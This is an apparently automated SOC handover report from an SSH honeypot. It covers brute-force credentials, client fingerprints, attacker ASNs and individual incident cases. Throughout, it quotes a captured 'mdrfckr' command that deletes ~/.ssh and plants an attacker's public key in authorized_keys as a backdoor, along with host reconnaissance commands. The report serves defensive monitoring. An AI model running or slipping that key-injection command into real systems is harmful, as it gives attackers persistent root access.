# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-26 |
| **Generated At** | 2026-04-26T06:10:21Z |
| **Shift Time** | 06:10 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **312** |
| Confirmed Threats | **213** |
| False Positives Filtered | **99** (31.7%) |
| Unique Attacker IPs | **24** |
| Countries of Origin | **15** |
| High Severity Cases | **66** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **246** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **164** |
| Unique Credential Pairs | **100** |
| Unique Usernames | **44** |
| Unique Passwords | **95** |
| Successful Auth Pairs | **39** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 66 |
| `345gs5662d34` | 31 |
| `ubuntu` | 7 |
| `admin` | 4 |
| `test` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 32 |
| `345gs5662d34` | 31 |
| `123` | 5 |
| `nPSpP4PBW0` | 3 |
| `` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 32 |
| `345gs5662d34` | `345gs5662d34` | 31 |
| `root` | `nPSpP4PBW0` | 3 |
| `admin` | `` | 2 |
| `sammy` | `sammy2025!` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `nPSpP4PBW0` | `195.161.114.163` | 2026-04-26T03:24:03 |
| `root` | `3245gs5662d34` | `195.161.114.163` | 2026-04-26T03:24:07 |
| `root` | `Hf123456` | `195.161.114.163` | 2026-04-26T03:25:38 |
| `root` | `root_123` | `195.161.114.163` | 2026-04-26T03:26:26 |
| `root` | `QQaa111` | `195.161.114.163` | 2026-04-26T03:29:30 |
| `root` | `66666` | `195.161.114.163` | 2026-04-26T03:32:34 |
| `root` | `Root01#$` | `103.179.56.78` | 2026-04-26T04:11:47 |
| `root` | `3245gs5662d34` | `103.179.56.78` | 2026-04-26T04:11:49 |
| `root` | `Root2024@@` | `45.78.198.228` | 2026-04-26T04:12:42 |
| `root` | `3245gs5662d34` | `45.78.198.228` | 2026-04-26T04:12:56 |
| `root` | `nPSpP4PBW0` | `103.179.56.78` | 2026-04-26T04:13:09 |
| `root` | `testpass` | `45.78.198.228` | 2026-04-26T04:14:23 |
| `root` | `demo123` | `103.179.56.78` | 2026-04-26T04:14:43 |
| `root` | `ccZZ1234` | `103.179.56.78` | 2026-04-26T04:16:17 |
| `root` | `Abcd123456789@123` | `103.179.56.78` | 2026-04-26T04:17:46 |
| `root` | `Welcome123` | `103.179.56.78` | 2026-04-26T04:19:19 |
| `root` | `CCxx1234` | `45.78.198.228` | 2026-04-26T04:20:41 |
| `root` | `Root54321@` | `103.179.56.78` | 2026-04-26T04:25:04 |
| `root` | `aa778899` | `103.179.56.78` | 2026-04-26T04:26:30 |
| `root` | `root666$` | `103.179.56.78` | 2026-04-26T04:27:58 |
| `root` | `123456789Ab` | `103.179.56.78` | 2026-04-26T04:29:26 |
| `root` | `2wsx3edc!@#` | `45.78.198.228` | 2026-04-26T04:36:28 |
| `root` | `nPSpP4PBW0` | `45.78.198.228` | 2026-04-26T04:37:57 |
| `root` | `Ww123456789` | `103.179.56.78` | 2026-04-26T04:39:34 |
| `root` | `woaini123` | `103.179.56.78` | 2026-04-26T04:42:38 |
| `root` | `qazwsx123.` | `154.81.15.63` | 2026-04-26T04:42:57 |
| `root` | `3245gs5662d34` | `154.81.15.63` | 2026-04-26T04:43:00 |
| `root` | `Qazwsx11111!@#` | `103.179.56.78` | 2026-04-26T04:44:06 |
| `root` | `2glehe5t24th1issZs` | `154.81.15.63` | 2026-04-26T04:45:06 |
| `root` | `Love@123` | `103.179.56.78` | 2026-04-26T04:45:34 |
| `root` | `Aa112211.` | `103.179.56.78` | 2026-04-26T04:47:00 |
| `root` | `abc.123456` | `154.81.15.63` | 2026-04-26T04:54:18 |
| `root` | `Han123456` | `154.81.15.63` | 2026-04-26T04:57:27 |
| `root` | `1q2w3e4r5t6y7u8i9o0p` | `154.81.15.63` | 2026-04-26T04:58:31 |
| `root` | `123qwe!@#QWE` | `154.81.15.63` | 2026-04-26T05:01:38 |
| `root` | `MoeClub.org` | `154.81.15.63` | 2026-04-26T05:04:55 |
| `root` | `Lol12345` | `88.147.30.59` | 2026-04-26T05:40:30 |
| `root` | `3245gs5662d34` | `88.147.30.59` | 2026-04-26T05:40:34 |
| `root` | `QWERTY2024!` | `88.147.30.59` | 2026-04-26T05:51:46 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **312** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 195 |
| Go SSH scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 151 | 4 |
| `03a80b21afa8...` | Modern SSH client | 44 | 5 |
| `f1e5e9d24e5e...` | Mirai/variant | 1 | 1 |
| `873a5fb5fedc...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 151 | 4 | libssh-based |
| `03a80b21afa8...` | libssh | 44 | 5 | Modern SSH client |
| `f1e5e9d24e5e...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 31 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
```
```
ls -lh $(which ls)
```
Source IPs: `45.78.198.228`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.179.56.78`, `195.161.114.163`, `88.147.30.59`, `154.81.15.63`, `45.78.198.228`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **24** |
| Unique ASNs | **20** |
| High-Risk ASNs | **13** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS7922` | Comcast Cable Communications, LLC | 2 | LOW |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS136052` | PT Cloud Hosting Indonesia | 1 | HIGH |
| `AS3786` | LG DACOM Corporation | 1 | MEDIUM |
| `AS18403` | FPT Telecom Company | 1 | LOW |
| `AS35612` | EOLO S.p.A. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (66)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-8e456fbf0aa0

| Field | Detail |
|---|---|
| **Source IP** | `195.161.114[.]163` |
| **First Seen** | 2026-04-26 03:24 |
| **Last Seen** | 2026-04-26 03:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 03:24:02` | `cowrie.session.connect` |
| `2026-04-26 03:24:02` | `cowrie.client.version` |
| `2026-04-26 03:24:02` | `cowrie.client.kex` |
| `2026-04-26 03:24:03` | `cowrie.login.success` |
| `2026-04-26 03:24:03` | `cowrie.session.params` |
| `2026-04-26 03:24:03` | `cowrie.command.input` |
| `2026-04-26 03:24:03` | `cowrie.command.failed` |
| `2026-04-26 03:24:04` | `cowrie.log.closed` |
| `2026-04-26 03:24:04` | `cowrie.session.params` |
| `2026-04-26 03:24:04` | `cowrie.command.input` |
| `2026-04-26 03:24:04` | `cowrie.session.file_download` |
| `2026-04-26 03:24:04` | `cowrie.log.closed` |
| `2026-04-26 03:24:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.161.114[.]163` to AbuseIPDB if not already reported
- [ ] Block `195.161.114[.]163` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47e546d8bae6

| Field | Detail |
|---|---|
| **Source IP** | `195.161.114[.]163` |
| **First Seen** | 2026-04-26 03:24 |
| **Last Seen** | 2026-04-26 03:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 03:24:06` | `cowrie.session.connect` |
| `2026-04-26 03:24:06` | `cowrie.client.version` |
| `2026-04-26 03:24:07` | `cowrie.client.kex` |
| `2026-04-26 03:24:07` | `cowrie.login.success` |
| `2026-04-26 03:24:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.161.114[.]163` to AbuseIPDB if not already reported
- [ ] Block `195.161.114[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-566023c37bf5

| Field | Detail |
|---|---|
| **Source IP** | `195.161.114[.]163` |
| **First Seen** | 2026-04-26 03:25 |
| **Last Seen** | 2026-04-26 03:25 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 03:25:38` | `cowrie.session.connect` |
| `2026-04-26 03:25:38` | `cowrie.client.version` |
| `2026-04-26 03:25:38` | `cowrie.client.kex` |
| `2026-04-26 03:25:38` | `cowrie.login.success` |
| `2026-04-26 03:25:39` | `cowrie.session.params` |
| `2026-04-26 03:25:39` | `cowrie.command.input` |
| `2026-04-26 03:25:39` | `cowrie.command.failed` |
| `2026-04-26 03:25:39` | `cowrie.log.closed` |
| `2026-04-26 03:25:39` | `cowrie.session.params` |
| `2026-04-26 03:25:39` | `cowrie.command.input` |
| `2026-04-26 03:25:40` | `cowrie.session.file_download` |
| `2026-04-26 03:25:40` | `cowrie.log.closed` |
| `2026-04-26 03:25:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.161.114[.]163` to AbuseIPDB if not already reported
- [ ] Block `195.161.114[.]163` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-373b9866c262

| Field | Detail |
|---|---|
| **Source IP** | `195.161.114[.]163` |
| **First Seen** | 2026-04-26 03:25 |
| **Last Seen** | 2026-04-26 03:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 03:25:42` | `cowrie.session.connect` |
| `2026-04-26 03:25:42` | `cowrie.client.version` |
| `2026-04-26 03:25:42` | `cowrie.client.kex` |
| `2026-04-26 03:25:43` | `cowrie.login.success` |
| `2026-04-26 03:25:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.161.114[.]163` to AbuseIPDB if not already reported
- [ ] Block `195.161.114[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ee862bdea4d

| Field | Detail |
|---|---|
| **Source IP** | `195.161.114[.]163` |
| **First Seen** | 2026-04-26 03:26 |
| **Last Seen** | 2026-04-26 03:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 03:26:25` | `cowrie.session.connect` |
| `2026-04-26 03:26:25` | `cowrie.client.version` |
| `2026-04-26 03:26:25` | `cowrie.client.kex` |
| `2026-04-26 03:26:26` | `cowrie.login.success` |
| `2026-04-26 03:26:26` | `cowrie.session.params` |
| `2026-04-26 03:26:26` | `cowrie.command.input` |
| `2026-04-26 03:26:26` | `cowrie.command.failed` |
| `2026-04-26 03:26:26` | `cowrie.log.closed` |
| `2026-04-26 03:26:27` | `cowrie.session.params` |
| `2026-04-26 03:26:27` | `cowrie.command.input` |
| `2026-04-26 03:26:27` | `cowrie.session.file_download` |
| `2026-04-26 03:26:27` | `cowrie.log.closed` |
| `2026-04-26 03:26:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.161.114[.]163` to AbuseIPDB if not already reported
- [ ] Block `195.161.114[.]163` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72e33b714345

| Field | Detail |
|---|---|
| **Source IP** | `195.161.114[.]163` |
| **First Seen** | 2026-04-26 03:26 |
| **Last Seen** | 2026-04-26 03:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 03:26:29` | `cowrie.session.connect` |
| `2026-04-26 03:26:29` | `cowrie.client.version` |
| `2026-04-26 03:26:29` | `cowrie.client.kex` |
| `2026-04-26 03:26:30` | `cowrie.login.success` |
| `2026-04-26 03:26:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.161.114[.]163` to AbuseIPDB if not already reported
- [ ] Block `195.161.114[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb1800430c01

| Field | Detail |
|---|---|
| **Source IP** | `195.161.114[.]163` |
| **First Seen** | 2026-04-26 03:29 |
| **Last Seen** | 2026-04-26 03:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 03:29:29` | `cowrie.session.connect` |
| `2026-04-26 03:29:29` | `cowrie.client.version` |
| `2026-04-26 03:29:29` | `cowrie.client.kex` |
| `2026-04-26 03:29:30` | `cowrie.login.success` |
| `2026-04-26 03:29:30` | `cowrie.session.params` |
| `2026-04-26 03:29:30` | `cowrie.command.input` |
| `2026-04-26 03:29:30` | `cowrie.command.failed` |
| `2026-04-26 03:29:30` | `cowrie.log.closed` |
| `2026-04-26 03:29:31` | `cowrie.session.params` |
| `2026-04-26 03:29:31` | `cowrie.command.input` |
| `2026-04-26 03:29:31` | `cowrie.session.file_download` |
| `2026-04-26 03:29:31` | `cowrie.log.closed` |
| `2026-04-26 03:29:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.161.114[.]163` to AbuseIPDB if not already reported
- [ ] Block `195.161.114[.]163` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18d1116e26cb

| Field | Detail |
|---|---|
| **Source IP** | `195.161.114[.]163` |
| **First Seen** | 2026-04-26 03:29 |
| **Last Seen** | 2026-04-26 03:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 03:29:33` | `cowrie.session.connect` |
| `2026-04-26 03:29:33` | `cowrie.client.version` |
| `2026-04-26 03:29:33` | `cowrie.client.kex` |
| `2026-04-26 03:29:34` | `cowrie.login.success` |
| `2026-04-26 03:29:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.161.114[.]163` to AbuseIPDB if not already reported
- [ ] Block `195.161.114[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab463b0ab3f3

| Field | Detail |
|---|---|
| **Source IP** | `195.161.114[.]163` |
| **First Seen** | 2026-04-26 03:32 |
| **Last Seen** | 2026-04-26 03:32 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 03:32:33` | `cowrie.session.connect` |
| `2026-04-26 03:32:33` | `cowrie.client.version` |
| `2026-04-26 03:32:34` | `cowrie.client.kex` |
| `2026-04-26 03:32:34` | `cowrie.login.success` |
| `2026-04-26 03:32:35` | `cowrie.session.params` |
| `2026-04-26 03:32:35` | `cowrie.command.input` |
| `2026-04-26 03:32:35` | `cowrie.command.failed` |
| `2026-04-26 03:32:35` | `cowrie.log.closed` |
| `2026-04-26 03:32:35` | `cowrie.session.params` |
| `2026-04-26 03:32:35` | `cowrie.command.input` |
| `2026-04-26 03:32:35` | `cowrie.session.file_download` |
| `2026-04-26 03:32:35` | `cowrie.log.closed` |
| `2026-04-26 03:32:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.161.114[.]163` to AbuseIPDB if not already reported
- [ ] Block `195.161.114[.]163` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46c2d248b44b

| Field | Detail |
|---|---|
| **Source IP** | `195.161.114[.]163` |
| **First Seen** | 2026-04-26 03:32 |
| **Last Seen** | 2026-04-26 03:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 03:32:38` | `cowrie.session.connect` |
| `2026-04-26 03:32:38` | `cowrie.client.version` |
| `2026-04-26 03:32:38` | `cowrie.client.kex` |
| `2026-04-26 03:32:39` | `cowrie.login.success` |
| `2026-04-26 03:32:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.161.114[.]163` to AbuseIPDB if not already reported
- [ ] Block `195.161.114[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6aa9bb894f0

| Field | Detail |
|---|---|
| **Source IP** | `103.179.56[.]78` |
| **First Seen** | 2026-04-26 04:11 |
| **Last Seen** | 2026-04-26 04:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:11:46` | `cowrie.session.connect` |
| `2026-04-26 04:11:46` | `cowrie.client.version` |
| `2026-04-26 04:11:46` | `cowrie.client.kex` |
| `2026-04-26 04:11:47` | `cowrie.login.success` |
| `2026-04-26 04:11:47` | `cowrie.session.params` |
| `2026-04-26 04:11:47` | `cowrie.command.input` |
| `2026-04-26 04:11:47` | `cowrie.command.failed` |
| `2026-04-26 04:11:47` | `cowrie.log.closed` |
| `2026-04-26 04:11:47` | `cowrie.session.params` |
| `2026-04-26 04:11:47` | `cowrie.command.input` |
| `2026-04-26 04:11:47` | `cowrie.session.file_download` |
| `2026-04-26 04:11:47` | `cowrie.log.closed` |
| `2026-04-26 04:11:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.56[.]78` to AbuseIPDB if not already reported
- [ ] Block `103.179.56[.]78` at perimeter firewall / security group
